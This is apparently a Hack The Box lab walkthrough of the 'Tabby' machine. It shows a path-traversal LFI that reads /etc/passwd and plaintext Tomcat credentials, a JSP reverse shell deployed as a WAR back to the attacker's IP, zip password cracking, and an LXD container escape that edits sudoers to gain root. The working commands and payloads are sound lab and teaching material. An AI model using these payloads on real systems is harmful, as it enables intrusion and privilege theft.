# Tabby (HTB)

## nmap

I started the Tabby box with nmap:
```bash
┌──(kali㉿kali)-[~/htb/tabby]
└─$ nmap 10.129.40.56 | tee nmap                                                       
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-13 12:46 EST
Nmap scan report for 10.129.40.56
Host is up (0.038s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 3.24 seconds
      
┌──(kali㉿kali)-[~/htb/tabby]
└─$ nmap 10.129.40.56 -p- -T5 | tee nmapf
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-13 12:53 EST
Warning: 10.129.40.56 giving up on port because retransmission cap hit (2).
Stats: 0:00:10 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 19.46% done; ETC: 12:54 (0:00:41 remaining)
Nmap scan report for megahosting.htb (10.129.40.56)
Host is up (0.037s latency).
Not shown: 65247 closed tcp ports (reset), 285 filtered tcp ports (no-response)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 41.41 seconds

┌──(kali㉿kali)-[~/htb/tabby]
└─$ nmap 10.129.40.56 -p 22,80,8080 -sC -sV | tee nmapv
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-13 12:55 EST
Nmap scan report for megahosting.htb (10.129.40.56)
Host is up (0.031s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 45:3c:34:14:35:56:23:95:d6:83:4e:26:de:c6:5b:d9 (RSA)
|   256 89:79:3a:9c:88:b0:5c:ce:4b:79:b1:02:23:4b:44:a6 (ECDSA)
|_  256 1e:e7:b9:55:dd:25:8f:72:56:e8:8e:65:d5:19:b0:8d (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Mega Hosting
8080/tcp open  http    Apache Tomcat
|_http-title: Apache Tomcat
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.99 seconds

```

## Web Exploitation

There's lines in the HTML code pointing to a domain 
```html
<a href="http://megahosting.htb/news.php?file=statement"
```
So I added that to my /etc/hosts file with: `sudo echo '10.129.45.173 megahosting.htb' >> /etc/hosts`

```bash
┌──(kali㉿kali)-[~/htb/tabby]
└─$ ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-directories.txt -u http://megahosting.htb/FUZZ/

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://megahosting.htb/FUZZ/
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-directories.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

files                   [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 35ms]
assets                  [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 36ms]
icons                   [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 33ms]
server-status           [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 30ms]

```
None of the directories ffuf found seemed useful, so I moved on.

There is a page at `http://megahosting.htb/news.php?file=statement`. Noticing the fact it's likely loading a file through the ?file get parameter, I chose to explore that.

Visiting `http://megahosting.htb/files/statement`, I get the file the news.php page is reflecting, I did this to make sure it's not appending any file extensions to the included file.

I was struggling hard with getting the LFI to work, and found out the payload didn't have to be this complicated, this does get me the contents of `/etc/passwd` however.
```sql
GET /news.php?file=a/../../../statement../../../../etc/passwd HTTP/1.1
Host: megahosting.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```
Returns:
```sql
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
tomcat:x:997:997::/opt/tomcat:/bin/false
mysql:x:112:120:MySQL Server,,,:/nonexistent:/bin/false
ash:x:1000:1000:clive:/home/ash:/bin/bash
```

Checking the news.php file wiht `GET /news.php?file=a/../../../statement/../../../../proc/self/cwd/news.php`, I found out that there are infact no filters whatsoever:
```
<?php
$file = $_GET['file'];
$fh = fopen("files/$file","r");
while ($line = fgets($fh)) {
  echo($line);
}
fclose($fh);
?>

```

Visiting the page at `http://megahosting.htb:8080/`, I saw it's a tomcat instance. The the default credentials `tomcat:s3cret` didn't work, though, tomcat does store it's login creds in plaintext.

I grabbed the credentials with: `GET /news.php?file=/../statement/../../../../../../usr/share/tomcat9/etc/tomcat-users.xml` 
which gave me: 
```xml
  <role rolename="manager-script"/>
   <user username="tomcat" password="$3cureP4s5w0rd123!" roles="admin-gui,manager-script"/>
```

The manager-script did stand out to me.
Firstly I tried ssh as ash with ```ssh ash@megahosting.htb```, though, it only allowed login through keys, which I didn't have, and ash lacked a ~/.ssh/ directory, so I couldn't just take an existing key.

At this point, I checked out the admin panels I could access. There was manager and host-manager. Manager was blocked, host-manager wasn't. You can't deploy any instances with host-manager,
so I moved on to manager. The link on the home directory of tomcat led to `/manager/html`, which is blocked. My user does have the `manager-script` role though, and visiting `/manager/text`, 
I had access.

Now, after researching online how to deploy apps through the text manager, I found you just do a HTTP PUT request to `/manager/text/deploy?path=/PATH&update=true`, along with the contents of your .war file.

I was trying to upload a .jsp webshell with the .war file for a while, something kept breaking though, so I gave up and just decided to use a reverse shell jsp file instead.
Using the jsp reverse tcp payload from `https://github.com/ivan-sincek/java-reverse-tcp`, I renamed the file to ington.jsp and I modified the port and IP adress numbers to match what I have with:
```jsp
<%
    out.print("<pre>");
    // change the host address and/or port number as necessary
    ReverseShell sh = new ReverseShell("10.10.14.162", 6100);
    sh.run();
    if (sh.getMessage() != null) { out.print(sh.getMessage()); }
    sh = null;
    System.gc();
    out.print("</pre>");
%>
```
Compiled it into a .war file with `jar cvf . ington.war`, and uploaded it with:
```bash
┌──(kali㉿kali)-[~]
└─$ curl -u 'tomcat:$3cureP4s5w0rd123!' 'http://megahosting.htb:8080/manager/text/deploy?path=/ingtonna&update=true' -X PUT --upload-file ~/ington.war
OK - Deployed application at context path [/ingtonna]
```
I started a netcat listener with `nc -lvnp 6100`, and visiting `http://megahosting.htb:8080/ingtonna/ington.jsp`,
I got the shell:
```bash
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
tomcat@tabby:/var/www/html$ id
uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)
```

# Privilege escalation to ash
I upgraded my shell with `stty raw -echo;fg` and `export TERM=xterm`, because I couldn't use arrow keys, backspace, or clear the screen.

I remembered there's a files directory in the `http://megahosting.htb/` app, I guessed it's in `/var/www/html/files`, and it was correct.

Listing the files in the directory returned:
```bash
tomcat@tabby:/var/www/html$ ls files
16162020_backup.zip  archive  revoked_certs  statement
```
The archive and revoked_certs both had 0 data. The backup file was interesting though. I downloaded by going to `http://megahosting.htb/files/16162020_backup.zip`.
Trying to unzip it with `7z t 16162020_backup.zip`, I saw it was password protected, and the password in the tomcat-users.xml file didn't work.

I used zip2john to get the hash of the zipfile with:
```bash
┌──(kali㉿kali)-[~/htb/tabby]
└─$ zip2john 16162020_backup.zip 
ver 1.0 16162020_backup.zip/var/www/html/assets/ is not encrypted, or stored with non-handled compression type
ver 2.0 efh 5455 efh 7875 16162020_backup.zip/var/www/html/favicon.ico PKZIP Encr: TS_chk, cmplen=338, decmplen=766, crc=282B6DE2 ts=7DB5 cs=7db5 type=8
ver 1.0 16162020_backup.zip/var/www/html/files/ is not encrypted, or stored with non-handled compression type
ver 2.0 efh 5455 efh 7875 16162020_backup.zip/var/www/html/index.php PKZIP Encr: TS_chk, cmplen=3255, decmplen=14793, crc=285CC4D6 ts=5935 cs=5935 type=8
ver 1.0 efh 5455 efh 7875 ** 2b ** 16162020_backup.zip/var/www/html/logo.png PKZIP Encr: TS_chk, cmplen=2906, decmplen=2894, crc=02F9F45F ts=5D46 cs=5d46 type=0
ver 2.0 efh 5455 efh 7875 16162020_backup.zip/var/www/html/news.php PKZIP Encr: TS_chk, cmplen=114, decmplen=123, crc=5C67F19E ts=5A7A cs=5a7a type=8
ver 2.0 efh 5455 efh 7875 16162020_backup.zip/var/www/html/Readme.txt PKZIP Encr: TS_chk, cmplen=805, decmplen=1574, crc=32DB9CE3 ts=6A8B cs=6a8b type=8
16162020_backup.zip:$pkzip$5*1*1*0*8*24*7db5*dd84cfff4c26e855919708e34b3a32adc4d5c1a0f2a24b1e59be93f3641b254fde4da84c*1*0*8*24*6a8b*32010e3d24c744ea56561bbf91c0d4e22f9a300fcf01562f6fcf5c986924e5a6f6138334*1*0*0*24*5d46*ccf7b799809a3d3c12abb83063af3c6dd538521379c8d744cd195945926884341a9c4f74*1*0*8*24*5935*f422c178c96c8537b1297ae19ab6b91f497252d0a4efe86b3264ee48b099ed6dd54811ff*2*0*72*7b*5c67f19e*1b1f*4f*8*72*5a7a*ca5fafc4738500a9b5a41c17d7ee193634e3f8e483b6795e898581d0fe5198d16fe5332ea7d4a299e95ebfff6b9f955427563773b68eaee312d2bb841eecd6b9cc70a7597226c7a8724b0fcd43e4d0183f0ad47c14bf0268c1113ff57e11fc2e74d72a8d30f3590adc3393dddac6dcb11bfd*$/pkzip$::16162020_backup.zip:var/www/html/news.php, var/www/html/favicon.ico, var/www/html/Readme.txt, var/www/html/logo.png, var/www/html/index.php:16162020_backup.zip
NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.
```

I was gonna crack it with hashcat, however, hashcat doesn't have this pkzip format, so I went with johntheripper instead.
```bash
┌──(kali㉿kali)-[~/htb/tabby]
└─$ john --wordlist=/usr/share/wordlists/SecLists/Passwords/Leaked-Databases/rockyou.txt zip.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
admin@it         (?)     
1g 0:00:00:00 DONE (2026-01-16 16:28) 1.234g/s 12788Kp/s 12788Kc/s 12788KC/s adormita..adj069
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
                      
┌──(kali㉿kali)-[~/htb/tabby]
└─$ john zip.hash --show
?:admin@it

1 password hash cracked, 0 left
```
It displayed as `?:admin@it`, which I thought was weird, and it didn't work with 7z either. Trying just `admin@it` worked fine though.

Exploring the files in the zip file, it was basically just a backup of the site, with some names and domains changed, nothing interesting other than that.
Trying `su ash` to switch my user to ash, with the `admin@it` password worked fine.

```bash
tomcat@tabby:/var/www/html$ su ash
Password: 
ash@tabby:/var/www/html$ id 
uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
```
## Privilege escalation to root
Firstly, I looked for files that had anything to do with the ash user 
```
ash@tabby:/$ find / -user "ash" 2>/dev/null | grep -v "/proc/" | grep -v "/run/" | grep -v "/sys/"
/var/www/html/files
/var/www/html/files/16162020_backup.zip
/home/ash
/home/ash/.profile
/home/ash/.bashrc
/home/ash/.bash_logout
/home/ash/user.txt
/home/ash/.cache
/home/ash/.cache/motd.legal-displayed
```
Trying it with the group ash also had nothing interesting, and neither were there any SUID files.

Going back to my groups though, I noticed LXD, which is a known gtfobin, a binary with which I can get root.

I downloaded an alpine container off of my local machine with 
```bash
ash@tabby:/dev/shm$ wget http://10.10.14.162:6101/alpine-v3.23-x86_64-20260118_1144.tar.gz
--2026-01-18 16:45:54--  http://10.10.14.162:6101/alpine-v3.23-x86_64-20260118_1144.tar.gz
Connecting to 10.10.14.162:6101... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4110576 (3.9M) [application/gzip]
Saving to: ‘alpine-v3.23-x86_64-20260118_1144.tar.gz’

alpine-v3.23-x86_64 100%[===================>]   3.92M  1.13MB/s    in 3.5s    

2026-01-18 16:45:58 (1.11 MB/s) - ‘alpine-v3.23-x86_64-20260118_1144.tar.gz’ saved [4110576/4110576]
```

I imported the image with:
```bash
ash@tabby:/dev/shm$ /snap/bin/lxc image import alpine-v3.23-x86_64-20260118_1144.tar.gz --alias moorur
ash@tabby:/dev/shm$ /snap/bin/lxc image list
+-------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+
| ALIAS | FINGERPRINT  | PUBLIC |          DESCRIPTION          | ARCHITECTURE |   TYPE    |  SIZE  |         UPLOAD DATE          |
+-------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+
| moorur| 2dff1e6c8925 | no     | alpine v3.23 (20260118_11:44) | x86_64       | CONTAINER | 3.92MB | Jan 18, 2026 at 4:50pm (UTC) |
+-------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+

ash@tabby:/dev/shm$ /snap/bin/lxd init
Would you like to use LXD clustering? (yes/no) [default=no]: 
Do you want to configure a new storage pool? (yes/no) [default=yes]: 
Name of the new storage pool [default=default]: 
Name of the storage backend to use (btrfs, dir, lvm, zfs, ceph) [default=zfs]: 
Create a new ZFS pool? (yes/no) [default=yes]: 
Would you like to use an existing empty block device (e.g. a disk or partition)? (yes/no) [default=no]: 
Size in GB of the new loop device (1GB minimum) [default=5GB]: 
Would you like to connect to a MAAS server? (yes/no) [default=no]: 
Would you like to create a new local network bridge? (yes/no) [default=yes]: 
What should the new bridge be called? [default=lxdbr0]: 
What IPv4 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]: 
What IPv6 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]: 
Would you like the LXD server to be available over the network? (yes/no) [default=no]: 
Would you like stale cached images to be updated automatically? (yes/no) [default=yes] 
Would you like a YAML "lxd init" preseed to be printed? (yes/no) [default=no]: 

```

After making the image work, I made a container rootington, in which I'd modify the /etc/sudoers file to give ash root privileges on all commands.
```bash
ash@tabby:/dev/shm$ lxc init moorur rootington -c security.privileged=true
Creating rootington

ash@tabby:/dev/shm$ lxc config device add rootington device-moorur disk source=/ path=/mnt/root
Device device-moorur added to rootington

ash@tabby:/dev/shm$ lxc exec rootington /bin/sh
~ # id
uid=0(root) gid=0(root)

~ # echo 'ash    ALL=(ALL:ALL) ALL' >> /mnt/root/etc/sudoers
```
Now going back to the main machine, I tested the sudo rights with `sudo -l` firstly, then I just ran `sudo su` and grabbed both flags.
```bash
ash@tabby:/dev/shm$ sudo -l
sudo: unable to open /run/sudo/ts/ash: Read-only file system
[sudo] password for ash: 
Matching Defaults entries for ash on tabby:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User ash may run the following commands on tabby:
    (ALL : ALL) ALL

ash@tabby:/dev/shm$ sudo su
sudo: unable to open /run/sudo/ts/ash: Read-only file system
[sudo] password for ash: 
root@tabby:/dev/shm# id
uid=0(root) gid=0(root) groups=0(root)



root@tabby:~# cat root.txt
096d96b3eb61f4f88269c8caa86b0682
root@tabby:~# cat /home/ash/user.txt 
29003ef730eb3971a68029286029785b
root@tabby:~# 
```
